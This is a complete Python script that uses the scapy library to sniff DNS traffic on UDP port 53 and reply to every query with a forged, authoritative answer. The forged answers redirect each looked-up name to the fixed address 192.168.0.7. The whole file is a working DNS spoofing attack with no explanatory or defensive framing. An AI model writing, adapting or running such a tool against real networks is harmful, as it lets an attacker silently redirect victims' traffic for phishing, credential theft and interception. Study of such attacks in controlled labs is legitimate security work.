from scapy.all import *
from scapy.layers.dns import DNSQR, DNS, DNSRR
from scapy.layers.inet import IP, UDP


def dnsSpoof(packet):
    spoofDNS = '192.168.0.7'
    dstip = packet[IP].src
    srcip = packet[IP].dst
    sport = packet[UDP].sport
    dport = packet[UDP].dport

    if packet.haslayer(DNSQR):
        dnsid = packet[DNS].id
        qd = packet[DNS].qd
        dnsrr = DNSRR(rrname=qd.qname, ttl=10, rdata=spoofDNS)
        spoofPacket = IP(dst=dstip, src=srcip) / UDP(dport=sport, sport=dport) /\
                      DNS(id=dnsid, qd=qd, aa=1, qr=1, an=dnsrr)
        send(spoofPacket)
        print('+++ SOURCE[{}] -> DEST[{}]'.format(dstip, srcip))
        print(spoofPacket.summary())

def main():
    print('+++ DNS SPOOF START...')
    sniff(filter='udp port 53', store=0, prn=dnsSpoof)

if __name__ == "__main__":
    main()